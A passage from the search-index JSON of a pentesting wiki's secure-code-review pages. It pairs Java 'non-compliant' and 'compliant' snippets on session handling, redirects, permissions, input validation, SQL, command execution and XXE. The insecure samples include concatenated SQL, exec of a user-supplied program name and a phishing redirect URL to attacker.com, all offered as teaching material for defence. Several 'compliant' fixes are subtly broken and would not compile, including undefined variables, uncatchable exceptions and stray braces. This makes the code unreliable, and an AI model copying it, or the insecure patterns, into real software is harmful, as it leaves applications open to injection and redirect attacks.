secure coding standards: OWASP Development Guide Project</p> </li> <li> <p>Build a re-usable object library: OWASP Enterprise Security API (ESAPI) Project</p> </li> <li> <p>Verify the effectiveness of security controls: OWASP Application Security Verification Standard (ASVS) Project)</p> </li> <li> <p>Establish secure outsourced development practices including defining security requirements and verification methodologies in both the request for proposal (RFP) and contract. OWASP Legal Project</p> </li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/recommendation-and-references/#external-references","title":"External References","text":"<ul> <li>Refer Secure Coding Guidelines for Java SE from Oracle</li> <li>Common Weakness Enumeration (CWE)</li> <li>SQL Injection Cheat Sheet</li> <li>Cross Site Scripting (XSS) Cheat Sheet</li> <li>Sans and TippingPoint \"The Top Cyber Security Risks\"</li> <li>Web Application Security Consortium</li> <li>Department of Homeland Security - Build Security in Portal</li> <li>CERT Secure Coding</li> <li>MSDN Security Developer Center</li> <li>Secure Coding Guidelines for Java SE</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/recommendation-and-references/#security-advisory-sites-to-check-for-known-vulnerabilities-against-supporting-infrastructure-and-frameworks","title":"Security Advisory Sites to check for known vulnerabilities against supporting infrastructure and frameworks","text":"<ul> <li>Secunia Citrix Vulnerability List</li> <li>Security Focus Vulnerability Search</li> <li>Open Source Vulnerability Database (OSVDB)</li> <li>Common Vulnerability Enumeration</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/","title":"Remedial Code Snippets","text":""},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#remedial-code-snippets","title":"Remedial Code Snippets","text":""},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#always-use-security-manager","title":"Always Use Security Manager","text":"<p>The security manager is a class that allows applications to implement a security policy. It allows an application to determine, before performing a possibly unsafe or sensitive operation, what the operation is and whether it is being attempted in a security context that allows the operation to be performed. The application can allow or disallow the operation.</p> <p>Non-Complaint Code:</p> <pre><code>try {\n System.setSecurityManager(null);\n} catch (SecurityException se) { System.out.println(\"SecurityManager is already set!\"); }\n</code></pre> <p>Running environment:</p> <p><code>Java &lt;application name&gt;</code></p> <p>Compliant Code:</p> <pre><code>try {\n System.setSecurityManager(new CustomSecurityManager(\"password here\"));\n SecurityManager sm = System.getSecurityManager();\n if(sm != null) { //check if file can be read\n FilePermission perm = new FilePermission(\"/temp/tempFile\", \"read\");\n sm.checkPermission(perm);\n }\n} catch (SecurityException se) { System.out.println(\"Not allowed\"); }\n</code></pre> <p>Running environment:</p> <pre><code>Java -Djava.security.manager -Djava.security.policy = policyURL &lt;application name&gt;\n</code></pre> <p>Risk Assessment</p> <p>Running Java code without a Security Manager being set means that there is no security at all.</p> Risk Level: High"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#do-not-bypass-security-manager-checks","title":"Do not Bypass Security Manager Checks","text":"<p> Security manager checks may be allowed to get bypassed depending on the immediate caller's class loader. When an API (see table below) is invoked on a class object, a comparison is run between the immediate caller's class loader and that of the class object. The class object is the object on which an API is invoked. For instance, in the presence of a security manager, the getSystemClassLoader and getParent methods succeed only if the caller's class loader is the delegation ancestor of the current class loader or if the caller's class loader is the same as the current one or if the code in the current execution context has the Run Time Permission, namely \"getClassLoader\".</p> APIs capable of bypassing the Security Manager\u2019s checks <code>java.lang.Class.newInstance</code> <code>java.lang.Class.getClassLoader</code> <code>java.lang.Class.getClasses</code> <code>java.lang.Class.getField(s)</code> <code>java.lang.Class.getMethod(s)</code> <code>java.lang.Class.getConstructor(s)</code> <code>java.lang.Class.getDeclaredClasses</code> <code>java.lang.Class.getDeclaredField(s)</code> <code>java.lang.Class.getDeclaredMethod(s)</code> <code>java.lang.Class.getDeclaredConstructor(s)</code> <code>java.lang.ClassLoader.getParent</code> <code>java.lang.ClassLoader.getSystemClassLoader</code> <code>java.lang.Thread.getContextClassLoader</code> <p>Non-Complaint Code:</p> <pre><code>public class UntrustedClass\n{ \n  public static void untrustedCode() {\n     Date now = new Date();\n     Class&lt;?&gt; dateClass = now.getClass();\n     ExceptionExample.createInstance(dateClass);\n    }\n }\npublic class ExceptionExample\n{\n    public static void createInstance(Class&lt;?&gt; dateClass)\n    {\n      try { // Create another Date object using the Date Class\n            Object o = dateClass.newInstance();\n            if (o instanceof Date) {\n              Date d = (Date)o;\n              System.out.println(\"The time is: \" + d.toString());\n             }\n       }\n       catch (InstantiationException ie) { System.out.println(ie.toString()); }\n       catch (IllegalAccessException iae) { System.out.println(iae.toString()); }       \n    }\n}\n</code></pre> <p>Do not accept Class, ClassLoader, or Thread instances from untrusted code or outside of your package. If inevitable, safely acquire these instances by ensuring they come from trusted sources. Additionally, make sure to discard tainted inputs from untrusted code. Likewise, objects returned by the affected methods should not be propagated back to the untrusted code.</p> <p>Compliant Code:</p> <pre><code>public class UntrustedClass\n{\n public static void untrustedCode() {\n Date now = new Date();\n ExceptionExample.createInstance(now);\n }\n }\npublic class ExceptionExample\n{\n public static void createInstance(Date dateObject)\n {\n try {\n Date d = dateObject; // Create another Date object\n System.out.println(\"The time is: \" + d.toString());\n }\n catch (IllegalAccessException iae) { System.out.println(iae.toString()); }\n }\n}\n</code></pre> <p>Risk Assessment</p> <p>Bypassing Security manager checks will seriously compromise the security of a Java application.</p> Risk Level: Medium"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#denial-of-service","title":"Denial of Service","text":"<p>Input into a system should be checked so that it will not cause excessive resource consumption disproportionate to that used to request the service. Commonly affected resources are CPU cycles, memory, disk space, and file descriptors.</p> <p>In rare cases, it may not be practical to ensure that the input is reasonable. It may be necessary to carefully combine resource checking with the logic of processing the data. In addition to attacks that cause excessive resource consumption, attacks that result in persistent DoS, such as wasting significant disk space, need to be defended against. Server systems should be especially robust against external attacks.</p>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#beware-of-activities-that-may-use-disproportionate-resources","title":"Beware of activities that may use disproportionate resources","text":"<p>Examples of attacks include:</p> <ul> <li>Requesting a large image size for vector graphics. For instance, SVG and font files.</li> <li>Integer overflow errors can cause sanity checking of sizes to fail.</li> <li>An object graph constructed by parsing a text or binary stream may have memory requirements many times that of the original data.</li> <li>\"Zip bombs\" whereby a short file is very highly compressed. For instance, ZIPs, GIFs and gzip encoded HTTP contents. When decompressing files, it is better to set limits on the decompressed data size rather than relying upon compressed size or meta-data.</li> <li>\"Billion laughs attack\" whereby XML entity expansion causes an XML document to grow dramatically during parsing. Set the XMLConstants.FEATURE_SECURE_PROCESSING feature to enforce reasonable limits.</li> <li>Causing many keys to be inserted into a hash table with the same hash code, turning an algorithm of around O(n) into O(n2).</li> <li>Regular expressions may exhibit catastrophic backtracking.</li> <li>XPath expressions may consume arbitrary amounts of processor time.</li> <li>Java deserialization and Java Beans XML deserialization of malicious data may result in unbounded memory or CPU usage.</li> <li>Detailed logging of unusual behavior may result in excessive output to log files.</li> <li>Infinite loops can be caused by parsing some corner case data. Ensure that each iteration of a loop makes some progress.</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#release-resources-in-all-cases","title":"Release resources in all cases","text":"<p>Some objects, such as open files, locks, and manually allocated memory, behave as resources that require every acquire operation to be paired with a definite release. It is easy to overlook the vast possibilities for execution paths when exceptions are thrown. Resources should always be released promptly no matter what.</p> <p>Even experienced programmers often handle resources incorrectly. In order to reduce errors, duplication should be minimized, and resource handling concerns should be separated. The Execute Around Method pattern provides an excellent way of extracting the paired acquire and release operations. The pattern can be used concisely using the Java SE 8 lambda feature.</p> <p>Non-Complaint Code:</p> <pre><code> long sum = readFileBuffered(InputStream in -&gt; {\n long current = 0;\n for (;;) {\n int b = in.read();\n if (b == -1) {\n return current;\n }\n current += b;\n }\n });\n</code></pre> <p>Complaint Code:</p> <pre><code>public  R readFileBuffered(\n    InputStreamHandler handler\n        ) throws IOException {\n            try (final InputStream in = Files.newInputStream(path)) {\n                handler.handle(new BufferedInputStream(in));\n            }\n}\n</code></pre> <p>For resources without support for the enhanced feature, use the standard resource acquisition and release.</p> <p>Complaint Code:</p> <pre><code>public  R locked(Action action) {\n    lock.lock();\n        try {\n            return action.run();\n        } finally {\n            lock.unlock();\n}\n</code></pre> <p>Ensure that any output buffers are flushed in the case that output was otherwise successful. If the flush fails, the code should exit via an exception.</p> <p>Complaint Code:</p> <pre><code>public void writeFile(\n        OutputStreamHandler handler\n        ) throws IOException {\n            try (final OutputStream rawOut = Files.newOutputStream(path)) {\n                final BufferedOutputStream out =\n                    new BufferedOutputStream(rawOut);\n                handler.handle(out);\n                out.flush();\n            }\n        }\n    }\n</code></pre> <p>Some decorators of resources may themselves be resources that require correct release. For instance, in the current Oracle JDK implementation compression-related streams are natively implemented using the C heap for buffer storage. Care must be taken that both resources are released in all circumstances.</p> <p>Complaint Code:</p> <pre><code>public void bufferedWriteGzipFile(\n OutputStreamHandler handler\n ) throws IOException {\n  try (\n   final OutputStream rawOut = Files.newOutputStream(path);\n   final OutputStream compressedOut =\n    new GzipOutputStream(rawOut);\n   ) {\n  final BufferedOutputStream out =\n    new BufferedOutputStream(compressedOut);\n  handler.handle(out);\n  out.flush();\n }\n }\n</code></pre> <p> Note, however, that in certain situations a try statement may never complete running (either normally or abruptly). For example, code inside of the try statement could indefinitely block while attempting to access a resource. If the try statement calls into untrusted code, that code could also intentionally sleep or block in order to prevent the clean-up code from being reached. As a result, resources used in a try-with-resources statement may not be closed, or code in a finally block may never be executed in these situations.</p>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#resource-limit-checks-should-not-suffer-from-integer-overflow","title":"Resource limit checks should not suffer from integer overflow","text":"<p>The Java language provides bounds checking on arrays which mitigates the vast majority of integer overflow attacks. However, some operations on primitive integral types silently overflow. Therefore, take care when checking resource limits. This is particularly important on persistent resources, such as disk space, where a reboot may not clear the problem.</p> <p>Some checking can be rearranged so as to avoid overflow. With large values, current + max could overflow to a negative value, which would always be less than max.</p> <p>Non-Complaint Code:</p> <pre><code>private void checkGrowBy(long extra) {\n  if (extra &lt; 0 || current &gt; max - extra) {\n  throw new IllegalArgumentException();\n   }\n  }\n }\n</code></pre> <p>If performance is not a particular issue, a verbose approach is to use arbitrary-sized integers.</p> <p>Complaint Code:</p> <pre><code>private void checkGrowBy(long extra) {\n    BigInteger currentBig = BigInteger.valueOf(current);\n    BigInteger maxBig = BigInteger.valueOf(max );\n    BigInteger extraBig = BigInteger.valueOf(extra );\n    if (extra &lt; 0 ||\n    currentBig.add(extraBig).compareTo(maxBig) &gt; 0) {\n    throw new IllegalArgumentException();\n  }\n }\n</code></pre> <p>A peculiarity of two's complement integer arithmetic is that the minimum negative value does not have a matching positive value of the same magnitude. So, <code>Integer.MIN_VALUE == -Integer.MIN_VALUE, Integer.MIN_VALUE == Math.abs(Integer.MIN_VALUE)</code>and, for integer <code>a, a &lt; 0</code> does not imply <code>-a &gt; 0</code>. The same edge case occurs for <code>Long.MIN_VALUE</code>.</p> <p>As of Java SE 8, the <code>java.lang.Math</code> class also contains methods for various operations (<code>addExact, multiplyExact, decrementExact</code>, etc.) that throw an ArithmeticException if the result overflows the given type.</p> <p>Risk Assessment.</p> Risk Level: High"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#session-managementurl-authorization","title":"Session Management/URL Authorization","text":"<p> Proper authentication and session management is critical to web application security. Flaws in this area most frequently involve the failure to protect credentials and session tokens through their lifecycle. These flaws can lead to the hijacking of user or administrative accounts, undermine authorization and accountability controls, and cause privacy violations</p> <p>Non-Complaint Code:</p> <pre><code>public void login(string username, string password)\n{\n    HttpSession session = request.getSession (true);\n//validate the username and password\n  //redirect to login page upon unsuccessful validation\n //upon successful validation\nCustomer customerBean = (Customer)\nsession.setAttribute(\"CustomerBean\", Customer);\n}\n</code></pre> <p>Other JSP and controller servlets</p> <pre><code>public Bool isLoged(string username, string password)\n{\n HttpSession session = request.getSession (true);\n Customer customerBean = (Customer)\n session.getAttribute('CustomerBean');\n if (customerBean == null) \n {\n  respoSpire.sendRedirect\n  (\"https://www.Spire.com/login.htm\");\n  return false;\n }\nreturn true;\n}\n</code></pre> <p>Compliant Code:</p> <p>Every time a user logs in to the application for the first, create a new session Id for the user and invalidate any existing session IDs.</p> <pre><code>public void login(string username, string password)\n{\n HttpSession session = request.getSession (true);\n//validate the username and password\n//redirect to login page upon unsuccessful validation\n//upon successful validation\n if (session.isNew() == false) {\nsession.invalidate();\nsession = request.getSession(true);\n}\n Customer customerBean = (Customer)\n session.setAttribute(\"CustomerBean\", Customer);\n}\n</code></pre> <pre><code>public Bool isLoged(string username, string password)\n{\n HttpSession session = request.getSession (true);\n Customer customerBean = (Customer)\n session.getAttribute('CustomerBean');\n if (customerBean == null)\n {\n respoSpire.sendRedirect\n (\"https://www.Spire.com/login.htm\");\n return false;\n }\nreturn true;\n}\n</code></pre> <p>Authorize the user before displaying any information to him. This can be accomplished by looking into the session for the object binded by the application to the user\u2019s session.</p> <p>If the cookie object is being set with various attributes apart from the session ID check the cookie is set only to transmit over HTTPS/SSL. In java, this is performed by the method</p> <p><code>cookie.setSecure()</code></p> <p>HTTPOnly cookie is meant to provide protection against XSS by not letting client-side script access the cookie. The HttpOnly property can be set on the JSESSIONID cookie as follows.</p> <pre><code>// Check if this is where the JSESSIONID is being set (assuming that JSESSIONID is the only cookie used)\nif (respoSpire.containsHeader(\"SET-COOKIE\"))\n{\n String sessionid = request.getSession().getId();\n respoSpire.setHeader(\"SET-COOKIE\", \"JSESSIONID=\" + sessionid + \"; Path=/\u2026..; HttpOnly\");\n}\n// Continue down the Filter Chain\nchain.doFilter(request, respoSpire);\n</code></pre> <p>In the scenario where custom cookies are being used, it can be set to HttpOnly, as follows:</p> <pre><code>respoSpire.setHeader(\"Set-Cookie\", \"originalcookiename=originalvalue; HTTPOnly\");\n</code></pre> <p>Invalidate the session at the time of logout.</p> <pre><code>session.invalidate();\nsession = request.getSession(true);\nsession.setAttribute(\"userid\",userid);\nrespoSpire.sendRedirect(\"login.jsp\");\n</code></pre> <p>Risk Assessment</p> <p>Session IDs help in identifying the user and maintaining his session. Hence it is important to have robust session management in place.</p> Risk Level: High"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#url-redirects-and-forwards","title":"URL Redirects and Forwards","text":"<p>Web applications frequently redirect and forward users to other pages and websites and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.</p> <p>Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a site, an attacker may successfully launch a phishing scam and steal user credentials.</p> <p>As the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Invalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application\u2019s access control check and then forward the attacker to privileged functions that they would normally not be able to access.</p> <p>Redirects</p> <p>Redirect functionality on a website allows a user\u2019s browser to be told to go to a different page on the site. This can be done to improve the user interface or track how users are navigating the site.</p> <p>To provide the redirect functionality a site may have a specific URL to perform the redirect:</p> <p><code>http:// www.example.com/utility/redirect.cgi</code></p> <p>This page will take a parameter (from URL or POST body) of \u2018URL\u2019 and will send back a message to the user\u2019s browser to go to that page, for example:</p> <p><code>http://www.example.com/utility/redirect.cgi?URL=http://www.example.com/viewtxn.html</code></p> <p>However, this can be abused as an attacker can attempt to make a valid user click on a link that appears to be for www.example.com but which will invoke the redirect functionality on example.com to cause the users browser to go to a malicious site (one that could look like example.com and trick the user into entering sensitive or authentication information:</p> <p><code>http://www.example.com/utiltiy/redirect cgi?URL=http://attacker.com/fakelogin.html</code></p> <p>Forwards</p> <p>Forwards are similar to redirects however the new page is not retrieved by the user\u2019s browser (as occurred with the redirect) but instead the server framework will obtain the forwarded page and return it to the user\u2019s browser. This is achieved by \u2018forward\u2019 commands within Java frameworks (e.g. Struts) or \u2018Server.Transfer\u2019 in .Net.</p> <p>As the forward is performed by the server framework itself, it limits the range of URLs the attacker can exploit to the current website (i.e. attacker cannot \u2018forward\u2019 to attacker.com), however, this attack can be used to bypass access controls. For example, where a site sends the forwarded page in the response:</p> <ul> <li>If purchasing, forward to \u2018purchase.do\u2019</li> <li>If cancelling, forward to \u2018cancelled.do\u2019</li> </ul> <p>This will then be passed as a parameter to the website:</p> <p><code>http://www.example.com/txn/acceptpayment.html?FWD=purchase</code></p> <p>If instead, an attacker used the forward to attempt to access a different page within the website, e.g. as the admin do, then they may access pages that they are not authorized to view, because authorization is being applied on the \u2018acceptpayment\u2019 page, instead of the forwarded page.</p> <p>If any part of the URL being forwarded, or redirected, to is based on user input, then the site could be at risk.</p> <p>Redirects</p> <p>The following examples demonstrate unsafe redirect and forward code. The following Java code receives the URL from the \u2018URL\u2019 parameter and redirects to that URL.</p> <p><code>response.sendRedirect(request.getParameter(\u201curl\u201d));</code></p> <p>The above code is vulnerable to an attack if no validation or extra method controls are applied to verify the certainty of the URL. This vulnerability could be used as part of a phishing scam by redirecting users to a malicious site. If user input has to be used as part of the URL to be used, then apply strict validation to the input, ensuring it cannot be used for purposes other than intended.</p> <p>Note that vulnerable code does not need to explicitly call a \u2018redirect\u2019 function, but instead could directly modify the response to cause the client browser to go to the redirected page.</p> <p>Where an attacker has posted a redirecting URL on a forum or sends in an e-mail, the website can check the referrer header to ensure the user is coming from a page within the site, although this countermeasure will not apply if the malicious URL is contained within the site itself.</p> <p>Consider creating a whitelist of URLs or options that a redirect is allowed to go to or deny the ability for the user input to determine the scheme or hostname of the redirect. A site could also encode (or encrypt) the URL value to be redirected to such that an attacker cannot easily create a malicious URL parameter that, when unencoded (or unencrypted), will be considered valid.</p> <p>Forwards</p> <p>The countermeasure for forwards is to either whitelist the range of pages that can be forwarded to (similar to redirects) and to enforce authentication on the forwarded page as well as the forwarding page. This means that even if an attacker manages to force a forward to a page, they should not have access to, the authentication check on the forwarded page will deny them access.</p> <p>Note on J2EE</p> <p>There is a noted flaw related to the \u201csendRedirect\u201d method in J2EE applications. For example:</p> <p><code>response.sendRedirect(\u201chome.html\u201d);</code></p> <p>This method is used to send a redirection response to the user who then gets redirected to the desired web component whose URL is passed an argument to the method. One such misconception is that execution flow in the Servlet/JSP page that is redirecting the user stops after a call to this method. Note that if there is code present after the \u2018If\u2019 condition it will be executed.</p> <p>The fact that execution of a servlet or JSP continues even after sendRedirect() method, also applies to Forward method of the RequestDispatcher Class. However, \\ tag is an exception, it is observed that the execution flow stops after the use of \\ tag.</p> <p>After issue, a redirect or forward, terminate code flow using a \u201creturn\u201d statement.</p> <p>Risk Assessment</p> Risk Level: High"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#grant-only-the-required-permission","title":"Grant Only the Required Permission","text":"<p> The java.security.AllPermission class grants all possible permissions to the caller. This facility was included for routine testing purposes to make it less cumbersome to deal with a multitude of permissions or for use when the code is completely trusted. It should never be applied in the production environment unless it\u2019s a trusted environment.</p> <p>Non-Complaint Code:</p> <pre><code>/* grant the thirdpartylib library AllPermission */\ngrant codebase \"file: ${ thirdpartylib.home}/j2ee/home/ thirdpartylib.jar\" {\n permission java.security.AllPermission;\n};\n</code></pre> <p>Compliant Code:</p> <pre><code>grant codeBase \"file:${ thirdpartylib.home}/j2ee/home/ thirdpartylib.jar\", signedBy \"AppropriateUser\" {\n permission java.io.FilePermission \"/tmp/*\", \"read\";\n permission java.io.SocketPermission \"*\", \"connect\";\n};\n} catch (SecurityException se) { System.out.println(\"Not allowed\"); }\n</code></pre> <p>In the case of a trusted third-party/in-house developed library where they need the permission as similar to the application, provide the permission same as the user who runs the application. Do not provide more than what is required.</p> <p>Risk Assessment</p> <p>Granting AllPermission to untrusted production code means that there is no security at all.</p> Risk Level: High"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#reflect-permission","title":"Reflect Permission","text":"<p>The suppressAccessChecks permission granted in the context of java.lang.reflect.ReflectPermission suppresses all standard Java language access checks when the permitted class tries to operate on public, default, protected or private members of another class. This implies that the permitted class can obtain permission to examine any field or invoke any method belonging to an arbitrary class.</p> <p>Non-Complaint Code:</p> <pre><code>/* grant the thirdpartylib library AllPermission */\ngrant codebase \"file:${ thirdpartylib.home}/j2ee/home/ thirdpartylib.jar\" {\n permission java.lang.reflect.ReflectPermission \"suppressAccessChecks\";\n};\n</code></pre> <p>Compliant Code:</p> <pre><code>grant codeBase \"file:${ thirdpartylib.home}/j2ee/home/ thirdpartylib.jar\", signedBy \"AppropriateUser\" {\n permission java.io.FilePermission \"/tmp/*\", \"read\";\n permission java.io.SocketPermission \"*\", \"connect\";\n};\n} catch (SecurityException se) { System.out.println(\"Not allowed\"); }\n</code></pre> <p>Risk Assessment</p> <p>Granting ReflectPermission with action suppressAccessChecks is dangerous because it allows normally inaccessible fields and methods to become available by using reflection.</p> Risk Level: High"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#input-data-validation","title":"Input Data Validation","text":"<p> Use a standard input validation mechanism to validate all input data for length, type, syntax, and business rules before accepting the data to be displayed or stored. Preferably use an \"accept known good\" validation strategy. Reject invalid input rather than attempting to sanitize potentially hostile data. Do not forget that error messages might also include invalid data.</p> <p>Client-side input validation is easy to bypass. Client-side validation can be implemented to improve performance, should not be trusted. Hence all the input validation should happen at the server-side.</p> <p>Following is the data validation strategy which needs to be followed.</p> <ul> <li>Known Good (Accept)</li> </ul> <p>In accept the known-good approach, you only allow the characters that are required by the application to carry out its task. For e.g. Username field requires only alphanumeric characters and can have a length restriction of 15 chars.</p> <p>Non-Complaint Code :</p> <pre><code>out.println(request.getParameter(\u201cusername\u201d));\n</code></pre> <p>Compliant Code :</p> <pre><code>public class ValidatingHttpRequest {\n public ValidatingHttpRequest(HttpServletRequest request) {\n super(request);\n }\n public String getParameter(String name) {\n HttpServletRequest req = (HttpServletRequest) super.getRequest();\n return validate( name, req.getParameter( name ) );\n }\n// This is a VERY restrictive pattern alphanumeric &lt; 20 chars\n private Pattern pattern = Pattern.compile(\"^[a-zA-Z0-9]{0,20}$\");\n private String validate( String name, String input ) throws ValidationException {\n// important - always canonicalize before validating\n String canonical = canonicalize( input );\n// check to see if input matches whitelist character set\n if ( !pattern.matcher( canonical ).matches() ) {\n throw new ValidationException( \"Improper format in \" + name + \" field\";\n }\n return sb.toString();\n }\n}\n</code></pre> <ul> <li>Known Bad (Reject)</li> </ul> <p>If the business requirement is to allow the use of special characters in the application, then in this scenario the characters which can cause harm to your application should be mandatorily rejected.</p> <p>The characters who are not supposed to pass through the application are:</p> <p><code>\u201c</code><code>&lt;</code><code>\u201d, \u201c</code><code>&gt;</code><code>\u201d, \u201c</code><code>%</code><code>\u201d, \u201c</code><code>&amp;</code><code>\u201d, \u201c</code><code>;</code><code>\u201d, \u201c</code><code>/</code><code>\u201d, \u201c</code><code>\u2019</code><code>\u201d, \u201c</code><code>+</code><code>\u201d, \u201c</code><code>--</code><code>\u201c, \u201c</code><code>xp_</code><code>\u201d</code></p> <p>Risk Assessment</p> <p>Most of the scripting and injection attacks happen due to improper/no validation of the user-supplied input. Hence it is critical that all the user-supplied input or input that can be tampered with by the user (cookies, hidden fields, headers etc.) and is used by the application are subjected to strict data validation.</p> Risk Level: High"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#injection-and-inclusion","title":"Injection and Inclusion","text":"<p>A very common form of attack involves causing a particular program to interpret data crafted in such a way as to cause an unanticipated change of control. Typically, but not always, this involves text formats.</p>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#generate-valid-formatting","title":"Generate valid formatting","text":"<p>Attacks using maliciously crafted inputs to cause incorrect formatting of outputs are well-documented [7]. Such attacks generally involve exploiting special characters in an input string, incorrect escaping, or partial removal of special characters.</p> <p>If the input string has a particular format, combining correction and validation is highly error-prone. Parsing and canonicalization should be done before validation. If possible, reject invalid data and any subsequent data, without attempting correction. For instance, many network protocols are vulnerable to cross-site POST attacks, by interpreting the HTTP body even though the HTTP header causes errors.</p> <p>Use well-tested libraries instead of ad hoc code. There are many libraries for creating XML. Creating XML documents using raw text is error-prone. For unusual formats where appropriate libraries do not exist, such as configuration files, create classes that cleanly handle all formatting and only formatting code.</p>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#avoid-dynamic-sql","title":"Avoid dynamic SQL","text":"<p>It is well known that dynamically created SQL statements including untrusted input are subject to command injection. This often takes the form of supplying an input containing a quote character (') followed by SQL. Avoid dynamic SQL.</p> <p>For parameterized SQL statements using Java Database Connectivity (JDBC), use <code>java.sql.PreparedStatement</code> or <code>java.sql.CallableStatement</code> instead of <code>java.sql.Statement</code>. In general, it is better to use a well-written, higher-level library to insulate application code from SQL. When using such a library, it is not necessary to limit characters such as quote ('). If text destined for XML/HTML is handled correctly during output (3.2.8.3), then it is unnecessary to disallow characters such as less than (&lt;) in inputs to SQL.</p> <p>Non Complaint Solution:</p> <pre><code>String sql = \"Select * from Customer where CustomerID =\u2019\u201d +request.getParameter(\u201ccustomerID\u201d) +\"\u2019\u201d;\nString sql = request.getParameter(\"customerID\");\nPreparedStatement prepStmt = con.prepareStatement(\"SELECT * FROM Customer WHERE CustomerId = '+sql+'\");\n</code></pre> <p>Compliant Code:</p> <pre><code>final String sql = \"Select * from Customer where CustomerID =?\";\nfinal PreparedStatement ps = con.prepareStatement(sql);\nps.setString(1,customerID)\nResultSet rs = ps.executeQuery();\n</code></pre>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#xml-and-html-generation-requires-care","title":"XML and HTML generation requires care","text":"<p>Untrusted data should be properly sanitized before being included in HTML or XML output. Failure to properly sanitize the data can lead to many different security problems, such as Cross-Site Scripting (XSS) and XML Injection vulnerabilities. It is important to be particularly careful when using Java Server Pages (JSP).</p> <p>There are many different ways to sanitize data before including it in output. Characters that are problematic for the specific type of output can be filtered, escaped, or encoded. Alternatively, characters that are known to be safe can be allowed, and everything else can be filtered, escaped, or encoded. This latter approach is preferable, as it does not require identifying and enumerating all characters that could potentially cause problems.</p> <p>Implementing correct data sanitization and encoding can be tricky and error-prone. Therefore, it is better to use a library to perform these tasks during HTML or XML construction.</p>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#avoid-any-untrusted-data-on-the-command-line","title":"Avoid any untrusted data on the command line","text":"<p>When creating new processes, do not place any untrusted data on the command line. Behavior is platform-specific, poorly documented, and frequently surprising.</p> <p>External programs can be invoked from Java code using the exec() method of <code>java.lang.Runtime</code> class. As a result, a reference to the Process class is returned to the JVM. The exitValue() method can be used to observe the return value of the process.</p> <p>Malicious data may, for instance, cause a single argument to be interpreted as an option (typically a leading - on Unix or / on Windows) or as two separate arguments. Any data that needs to be passed to the new process should be passed either as encoded arguments (e.g., Base64), in a temporary file, or through an inherited channel.</p> <p>Non Complaint Solution:</p> <pre><code>// security manager check\nString programName = System.getProperty(\"program.name\");\nif (programName != null){\n // runs user controlled program\n Runtime runtime = Runtime.getRuntime();\n Process proc = runtime.exec(\"/bin/sh \" + programName);\n}\n</code></pre> <p>Compliant Code:</p> <pre><code>process proc;\nint filename = Integer.parseInt(System.getproperty(\"program.name\")); // only allow integer choices\nRuntime = Runtime.getRuntime();\nswitch(filename) {\n case 1: proc = runtime.exec(\"hardcoded\\program1\"); break; // option 1\n case 2: proc = runtime.exec(\"hardcoded\\program2\"); break; // option 2\n default: System.out.println(\"Invalid option!\"); break;\n}\n</code></pre>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#restrict-xml-inclusion","title":"Restrict XML inclusion","text":"<p>XML Document Type Definitions (DTDs) allow URLs to be defined as system entities, such as local files and HTTP URLs within the local intranet or localhost. XML External Entity (XXE) attacks insert local files into XML data which may then be accessible to the client. Similar attacks may be made using XInclude, the XSLT document function, and the XSLT import and include elements. The safest way to avoid these problems while maintaining the power of XML is to reduce privileges and to use the most restrictive configuration possible for the XML parser. Reducing privileges still allows you to grant some access, such as inclusion to pages from the same-origin website if necessary. XML parsers can also be configured to limit functionality based on what is required, such as disallowing external entities or disabling DTDs altogether.</p> <p>Note that this issue generally applies to the use of APIs that use XML but are not specifically XML APIs.</p> <p>Non-Complaint Code:</p> <pre><code>private void receiveXMLStream(InputStream is, DefaultHandler defHandler) {\n  SAXParserFactory factory = SAXParserFactory.newInstance();\n  try {\n    SAXParser saxParser = factory.newSAXParser();\n    saxParser.parse(is, defHandler);\n  } catch (Throwable t) { /* Call custom exception handler */ }\n}\n// Default handler\nclass ErrorHandler extends DefaultHandler {\n   private void report(SAXParseException s) {\n      System.out.println(s.getLineNumber()+ \": \" + s.getMessage()); // handle as required\n   }\n   public void warning(SAXParseException s) {\n      report(s);\n   }\n   public void error(SAXParseException s) {\n      report(s);\n   }\n   public void fatalError(SAXParseException s) throws SAXParseException {\n      report(s);\n      throw s;\n   }\n  /* May also contain usual parsing code (event handling) */\n}\n</code></pre> <p>A valid XML statement will pass thru this server-level validation. Also, when there are two tags with the same tag name the SAX parser will override the old tag data with the latest. Even if this is not possible, the user can enter comments to bypass certain values and lot of other valid XML-based attacks can be performed.</p> <p>Compliant Code:</p> <pre><code>private static void receiveXMLStream(InputStream inStream, DefaultHandler defHandler)\n throws ParserConfigurationException, SAXException, IOException {\n SchemaFactory sf = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\n sf.setErrorHandler(new ErrorHandler());\n StreamSource ss = new StreamSource(new File(\"defaultschema.xsd\"));\n Schema schema = sf.newSchema(ss);\n SAXParserFactory spf = SAXParserFactory.newInstance();\n spf.setSchema(schema);\n SAXParser saxParser = spf.newSAXParser();\n saxParser.parse(inStream, defHandler);\n}\n</code></pre> <p>Likewise, when the Document Object Model (DOM) approach is used to parse XML structures, the DOM validation features of JAXP should be 